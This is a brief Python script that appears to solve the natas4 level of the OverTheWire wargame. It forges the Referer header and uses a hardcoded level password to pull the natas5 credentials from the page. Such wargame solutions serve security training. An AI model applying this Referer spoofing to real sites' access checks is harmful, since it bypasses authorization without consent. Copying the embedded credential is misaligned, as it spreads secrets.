import requests
url="http://natas4.natas.labs.overthewire.org"
auth_name = 'natas4'
auth_pass = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'

s=requests.get(url,auth=(auth_name,auth_pass),headers={'referer':"http://natas5.natas.labs.overthewire.org/"})

for i in s.iter_lines():
    if("natas5" in i.decode("utf-8")):
        print(i)
